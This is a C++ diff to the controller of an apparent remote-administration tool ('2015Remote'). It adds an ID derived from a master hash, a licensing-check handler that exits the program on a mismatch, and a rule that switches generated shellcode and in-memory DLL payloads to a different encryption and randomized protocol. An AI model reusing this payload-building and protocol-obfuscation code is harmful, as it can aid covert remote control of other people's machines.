@@ -282,6 +282,11 @@ std::vector<DllInfo*> ReadAllDllFilesWindows(const std::string& dirPath) {
 
 CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::IDD, pParent)
 {
+	auto s = GetMasterHash();
+	char buf[17] = { 0 };
+	std::strncpy(buf, s.c_str(), 16);
+	m_superID = std::strtoull(buf, NULL, 16);
+
 	m_nMaxConnection = 0;
 	m_hExit = CreateEvent(NULL, TRUE, FALSE, NULL);
 	m_hIcon = THIS_APP->LoadIcon(IDR_MAINFRAME);
@@ -391,6 +396,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENDRAWINGBOARD, OnOpenDrawingBoard)
 	ON_MESSAGE(WM_UPXTASKRESULT, UPXProcResult)
 	ON_MESSAGE(WM_PASSWORDCHECK, OnPasswordCheck)
+	ON_MESSAGE(WM_SHOWMESSAGE, OnShowMessage)
 	ON_WM_HELPINFO()
 	ON_COMMAND(ID_ONLINE_SHARE, &CMy2015RemoteDlg::OnOnlineShare)
 	ON_COMMAND(ID_TOOL_AUTH, &CMy2015RemoteDlg::OnToolAuth)
@@ -638,6 +644,21 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
 	SendMasterSettings(ContextObject);
 }
 
+LRESULT CMy2015RemoteDlg::OnShowMessage(WPARAM wParam, LPARAM lParam) {
+	std::string pwd = THIS_CFG.GetStr("settings", "Password");
+	if (pwd.empty())
+		ShowMessage("授权提醒", "程序可能有使用限制，请联系管理员请求授权");
+
+	if (wParam && lParam)
+	{
+		uint32_t recvLow = (uint32_t)wParam;
+		uint32_t recvHigh = (uint32_t)lParam;
+		uint64_t restored = ((uint64_t)recvHigh << 32) | recvLow;
+		if (restored != m_superID)
+			exit(-1);
+	}
+	return S_OK;
+}
 
 VOID CMy2015RemoteDlg::ShowMessage(CString strType, CString strMsg)
 {
@@ -729,6 +750,11 @@ Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true, const std::string &addr="")
 			splitIpPort(addr, ip, port);
 			server->SetServer(ip.c_str(), atoi(port.c_str()));
 			server->SetAdminId(GetMasterHash().c_str());
+		}
+		if (g_2015RemoteDlg->m_superID % 313 == 0)
+		{
+			server->iHeaderEnc = PROTOCOL_HELL;
+			server->protoType = PROTO_RANDOM;
 		}
 		server->SetType(isDLL ? CLIENT_TYPE_MEMDLL : CLIENT_TYPE_SHELLCODE);
 		memcpy(server->pwdHash, GetPwdHash().c_str(), 64);
@@ -889,12 +915,14 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 				p->SetServer(v->Admin, v->Port);
 				p->SetAdminId(GetMasterHash().c_str());
 				p->iType = CLIENT_TYPE_MEMDLL;
+				p->parentHwnd = (uint64_t)GetSafeHwnd();
 				memcpy(p->pwdHash, GetPwdHash().c_str(), 64);
 				m_tinyDLL = MemoryLoadLibrary(data, size);
 			}
 			SAFE_DELETE_ARRAY(data);
 		}
 	}
+	g_2015RemoteDlg = this;
 	m_ServerDLL[PAYLOAD_DLL_X86] = ReadKernelDll(false, true, master);
 	m_ServerDLL[PAYLOAD_DLL_X64] = ReadKernelDll(true, true, master);
 	m_ServerBin[PAYLOAD_DLL_X86] = ReadKernelDll(false, false, master);
@@ -907,7 +935,7 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 
 	// TODO: 在此添加额外的初始化代码
 	isClosed = FALSE;
-	g_2015RemoteDlg = this;
+
 	CreateToolBar();
 	InitControl();
 
